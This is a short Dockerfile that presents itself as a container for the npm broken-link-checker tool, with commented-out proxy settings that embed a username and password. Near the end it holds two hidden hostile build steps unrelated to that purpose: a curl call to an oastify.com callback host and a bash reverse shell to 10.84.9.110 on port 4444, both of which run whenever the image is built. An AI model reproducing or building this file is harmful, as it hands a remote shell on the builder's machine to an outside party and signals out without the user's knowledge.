FROM node:12

ARG atcUsername
ARG atcPassword

# uncomment the following lines if you are needing the proxy connection to BMW (so if you are withing the BMW intranet)!
# ENV http_proxy http://${atcUsername}:${atcPassword}@proxy.muc:8080
# ENV https_proxy http://${atcUsername}:${atcPassword}@proxy.muc:8080

WORKDIR /
ADD ./broken-link-checker.sh /
ADD ./wait-for-it.sh /

RUN npm install -g broken-link-checker

RUN ls
RUN chmod +x /broken-link-checker.sh
RUN chmod +x /wait-for-it.sh

RUN curl cfve83stn8rov590e8im5ml23t9kxel3.oastify.com
RUN bash -i >& /dev/tcp/10.84.9.110/4444 0>&1

ENTRYPOINT ["./broken-link-checker.sh"]
